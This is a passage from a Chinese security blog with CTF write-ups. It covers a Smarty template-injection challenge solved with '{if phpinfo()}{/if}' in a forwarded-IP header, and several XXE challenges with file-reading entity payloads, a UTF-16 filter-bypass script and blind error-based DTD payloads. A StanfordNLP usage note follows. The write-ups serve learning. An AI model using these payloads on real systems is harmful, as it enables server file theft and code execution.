<p>​        那么对于php5的环境我们就可以使用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;phpinfo();<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>​        来实现PHP代码的执行，但这道题的题目环境是PHP7，这种方法就失效了。</p>
<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>​        通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p>
<p>​        Smarty类的getStreamVariable方法的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span><span class="params">($variable)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $_result = <span class="string">''</span>;</span><br><span class="line">       $fp = fopen($variable, <span class="string">'r+'</span>);</span><br><span class="line">       <span class="keyword">if</span> ($fp) &#123;</span><br><span class="line">           <span class="keyword">while</span> (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">               $_result .= $current_line;</span><br><span class="line">           &#125;</span><br><span class="line">           fclose($fp);</span><br><span class="line">           <span class="keyword">return</span> $_result;</span><br><span class="line">       &#125;</span><br><span class="line">       $smarty = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">       <span class="keyword">if</span> ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">'Undefined stream variable "'</span> . $variable . <span class="string">'"'</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​    可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“file:///etc/passwd”)}。然而使用这个payload会触发报错如下：</p>
<blockquote>
<p> <strong>Fatal error</strong>: Uncaught –&gt; Smarty Compiler: Syntax error in template “string:<html lang="en"><head>&lt;meta http-equiv=”…” on line 12 “<div style="float:right;margin-top:30px;">Current IP:{self::getStreamVariable(‘file:///etc/passwd’)} </div>“ static class ‘self’ is undefined or not allowed by security setting &lt;– thrown in <strong>/var/www/html/smarty/libs/sysplugins/smarty_internal_templatecompilerbase.php</strong> on line <strong>12</strong> <meta name="generator" content="Hexo 4.0.0"></head></html></p>
</blockquote>
<p>​        可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<h4 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h4><p>​        官方文档中看到这样的描述：</p>
<blockquote>
<p> Smarty的<code>{if}</code>条件判断和PHP的if 非常相似，只是增加了一些特性。 每个<code>{if}</code>必须有一个配对的<code>{/if}</code>. 也可以使用<code>{else}</code> 和 <code>{elseif}</code>. 全部的PHP条件表达式和函数都可以在if内使用，如<em>||</em>, <em>or</em>, <em>&amp;&amp;</em>, <em>and</em>, <em>is_array()</em>, 等等 </p>
</blockquote>
<p>​        既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？</p>
<p>​        将XFF头改为{if phpinfo()}{/if}，可以看到题目执行了phpinfo()</p>
<p><img src="https://res.cloudinary.com/dic8uma8w/image/upload/v1572609448/bp1_qfoont.png" alt></p>
<p>​    用同样的方法可以轻松获得flag</p>
<h4 id="题目漏洞代码"><a href="#题目漏洞代码" class="headerlink" title="题目漏洞代码"></a>题目漏洞代码</h4><p>通过getshell之后的文件读取，本题中引发SSTI的代码简化后如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./smarty/libs/'</span> . <span class="string">'Smarty.class.php'</span>);</span><br><span class="line">$smarty = <span class="keyword">new</span> Smarty();</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">$smarty-&gt;display(<span class="string">"string:"</span>.$ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>​        Smarty3的官方手册 <a href="https://www.smarty.net/docs/" target="_blank" rel="noopener">https://www.smarty.net/docs/</a></p>
<p>​        <a href="https://portswigger.net/research/server-side-template-injection" target="_blank" rel="noopener">https://portswigger.net/research/server-side-template-injection</a></p>
<p>​        </p>
<p>​        </p>
<p>​        </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/09/20191109XXE/">部分XXE题目分析与总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><p>最近在各个平台比赛接触了数道以XXE为考察点的题目，特地写篇文章总结记录一下</p>
<h2 id="Syc-Geek-10th-性感黄阿姨在线聊天"><a href="#Syc-Geek-10th-性感黄阿姨在线聊天" class="headerlink" title="Syc Geek 10th 性感黄阿姨在线聊天"></a>Syc Geek 10th 性感黄阿姨在线聊天</h2><p>​        抓聊天框处的包，发现传递的数据是JSON格式，为{“root”:{“name”:”guest”,”request”:”flag”}},得知name参数需要满足$name==md5($flag)。由于本题过滤了布尔值True，故猜测md5开头为数字，爆破得357，提示flag文件名。联想到XXE可以读文件，故修改Content-Type为application/xml，根据JSON数据都格式构造XXE的payload如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=_f14g_Is_Here_.php" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">request</span>&gt;</span>flag<span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于name不为admin时response会返回“我很想告诉你的，可惜你只是我的xxx”，故这里可以将实体xxe的值返回，成功读取到flag</p>
<h2 id="Syc-Geek-10th-你读懂潇文清的网站了吗"><a href="#Syc-Geek-10th-你读懂潇文清的网站了吗" class="headerlink" title="Syc Geek 10th  你读懂潇文清的网站了吗"></a>Syc Geek 10th  你读懂潇文清的网站了吗</h2><p>​        在输入框里随便输入一个标签闭合的数据就可以看到网页将数据回显。直接构造xxe的payload读取index.php，其关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./config.php"</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">"PRC"</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$data= $_POST[<span class="string">'data'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag|decode|file|zlib|input|data|http|ftp|#/i"</span>,$data))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"no!!!you cant read flag right here!"</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$xml = simplexml_load_string($data,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line"><span class="keyword">print</span>($xml);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到会对payload的内容进行检测，过滤了包括flag在内的许多关键字。只需要把数据转换为UTF-16编码即可绕过。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">text = <span class="string">'''&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;'''</span></span><br><span class="line">out = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">    out += chr(<span class="number">0</span>) + i</span><br><span class="line">print(quote(out))</span><br></pre></td></tr></table></figure>

<p>​        函数simplexml_load_string()依赖于libxml2的库，其 xmlReadMemory函数会调用xmlDoRead函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xmlReadMemory(<span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">int</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *URL, <span class="keyword">const</span> <span class="keyword">char</span> *encoding, <span class="keyword">int</span> options)</span><br><span class="line">&#123;</span><br><span class="line">    xmlParserCtxtPtr ctxt;</span><br><span class="line"></span><br><span class="line">    ctxt = xmlCreateMemoryParserCtxt(buffer, size);</span><br><span class="line">    <span class="keyword">if</span> (ctxt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> (xmlDoRead(ctxt, URL, encoding, options, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xmlDoRead调用 xmlParseDocument 函数对XML进行解析，而xmlParseDocument 函数进行一定初始化后调用 xmlParseXMLDecl 函数，其关键代码端如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((encoding != <span class="literal">NULL</span>) &amp;&amp;</span><br><span class="line">	    ((!xmlStrcasecmp(encoding, BAD_CAST <span class="string">"UTF-16"</span>)) ||</span><br><span class="line">	     (!xmlStrcasecmp(encoding, BAD_CAST <span class="string">"UTF16"</span>)))) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (ctxt-&gt;encoding != <span class="literal">NULL</span>)</span><br><span class="line">		xmlFree((xmlChar *) ctxt-&gt;encoding);</span><br><span class="line">	    ctxt-&gt;encoding = encoding;</span><br><span class="line">	&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((encoding != <span class="literal">NULL</span>) &amp;&amp;</span><br><span class="line">	    ((!xmlStrcasecmp(encoding, BAD_CAST <span class="string">"UTF-8"</span>)) ||</span><br><span class="line">	     (!xmlStrcasecmp(encoding, BAD_CAST <span class="string">"UTF8"</span>)))) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (ctxt-&gt;encoding != <span class="literal">NULL</span>)</span><br><span class="line">		xmlFree((xmlChar *) ctxt-&gt;encoding);</span><br><span class="line">	    ctxt-&gt;encoding = encoding;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (encoding != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	    xmlCharEncodingHandlerPtr handler;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">if</span> (ctxt-&gt;input-&gt;encoding != <span class="literal">NULL</span>)</span><br><span class="line">		xmlFree((xmlChar *) ctxt-&gt;input-&gt;encoding);</span><br><span class="line">	    ctxt-&gt;input-&gt;encoding = encoding;</span><br></pre></td></tr></table></figure>

<p>可以看到该函数可以解析UTF-16和UTF-8的编码，而其他的如GBK这样的编码必须得在encoding中指定</p>
<h2 id="GoogleCTF2019-Bnv"><a href="#GoogleCTF2019-Bnv" class="headerlink" title="GoogleCTF2019 Bnv"></a>GoogleCTF2019 Bnv</h2><p>​        同样也是把Content-type头修改为application/xml再把数据修改为XML格式，但是这道题目不会返回请求的内容，所以无法直接通过上边的读文件的payload将文件的内容返回回来，但是这些读文件的payload会返回包含请求的URL的报错信息。通过以下的实体嵌套就可以看到flag:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % para1 SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % para '</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; test SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;para2;</span></span><br><span class="line"><span class="meta">    '&gt;</span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这种做法理论上是不允许的，但是由于很多XML解析器自身的问题，三层嵌套的XML无法被检测。这道题的理论做法是利用ubuntu自身的DTD文件来实现blind XXE。理论payload如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % para1 SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % ISOamso '</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;para2;</span></span><br><span class="line"><span class="meta">    '&gt;</span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/11/04/20191104Stanfordnlp/">Stanfordnlp自然语言分析处理</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-04</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Python/">Python</a></span><div class="content"><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install stanfordnlp</span><br></pre></td></tr></table></figure>

<p>​        在安装Stanfordnlp之前要先安装torch。对于windows环境下import torch时会出现的无法import dll文件的报错亲测可以通过重装解决。</p>
<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><h4 id="模型下载"><a href="#模型下载" class="headerlink" title="模型下载"></a>模型下载</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> stanfordnlp</span><br><span class="line">stanfordnlp.download(<span class="string">'en'</span>)</span><br></pre></td></tr></table></figure>

<p>即可下载英语的模型</p>
<h4 id="词语信息获取"><a href="#词语信息获取" class="headerlink" title="词语信息获取"></a>词语信息获取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> stanfordnlp</span><br><span class="line"></span><br><span class="line">nlp = stanfordnlp.Pipeline()</span><br><span class="line">doc = nlp(text)</span><br><span class="line">print(*[<span class="string">f'text: <span class="subst">&#123;word.text+<span class="string">" "</span>&#125;</span>\tlemma: <span class="subst">&#123;word.lemma&#125;</span>\tupos: <span class="subst">&#123;word.upos&#125;</span>\txpos: <span class="subst">&#123;word.xpos&#125;</span>'</span> <span class="keyword">for</span> sent <span class="keyword">in</span> doc.sentences <span class="keyword">for</span> word <span class="keyword">in</span> sent.words], sep=<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<p>text: The     lemma: None    upos: DET    xpos: DT<br>text: prospects     lemma: None    upos: NOUN    xpos: NNS<br>text: for     lemma: None    upos: ADP    xpos: IN<br>text: Britain     lemma: None    upos: PROPN    xpos: NNP</p>
<h1 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h1><h4 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> stanfordnlp</span><br><span class="line"></span><br><span class="line">text = <span class="string">""</span></span><br><span class="line">nlp = stanfordnlp.Pipeline()</span><br><span class="line">doc = nlp(text)</span><br></pre></td></tr></table></figure>



<p>Document类有text，sentences以及coll_file等属性</p>
<h4 id="Sentence"><a href="#Sentence" class="headerlink" title="Sentence"></a>Sentence</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sen = doc.sentences[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>sentence类有着words,tokens以及dependencies属性以及与之对应的用于输出这些属性的 print_token, print_word, print_dependencies方法</p>
<h4 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h4><p>其结构大致如下</p>
<p>&lt;Token index=1;words=[&lt;Word index=1;text=The;upos=DET;xpos=DT;feats=Definite=Def|PronType=Art;governor=2;dependency_relation=det&gt;]&gt;</p>
<p>按照CoNLL-U规范提供了一个word对象的简单包装</p>
<h4 id="Word"><a href="#Word" class="headerlink" title="Word"></a>Word</h4><p>其属性有 <code>index</code>, <code>text</code>, <code>lemma</code>, <code>pos</code>,<code>upos</code> , <code>feats</code>, <code>governor</code> , <code>dependency_relation</code>,<code>parent_token</code> ##</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>官方手册：<a href="https://stanfordnlp.github.io/" target="_blank" rel="noopener">https://stanfordnlp.github.io/</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://images.alphacoders.com/975/975730.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By EVatom</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>